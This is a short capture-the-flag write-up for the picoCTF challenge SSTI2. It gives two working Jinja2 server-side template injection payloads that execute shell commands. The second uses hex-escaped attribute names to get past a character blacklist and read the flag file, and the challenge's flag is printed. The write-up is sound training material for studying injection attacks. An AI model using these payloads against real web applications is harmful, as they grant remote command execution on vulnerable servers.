# Description
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

Additional details will be available after launching your challenge instance.
# Solution

-  This challenge is a continuation of the challenge [SSTI1](picoCTF/primerExamenParcial/SSTI1.md) and like this challenge I'll be using  [Server Side Template Injection](https://www.geeksforgeeks.org/what-is-server-side-template-injection/)  after trying to use the same command that I use in the previous challenge I don't get the waited output since now it use a blacklist to delete some characters.

``` bash 
# Input for the message field 
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
# Output 
Stop trying to break me >:(
```

- Since I couldn't  successfully exec commands in the server I try to obfuscate the previous input and now it overpass the blacklist of the filter and I get the flag.

```bash
# Input for the message field 
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
# Output 
picoCTF{sst1_f1lt3r_byp4ss_96a02202}
```

# References
- [PicoCTF 2025 — SSTI2](https://medium.com/@kheyraldhs12/picoctf-2025-ssti2-a047c0c5887a)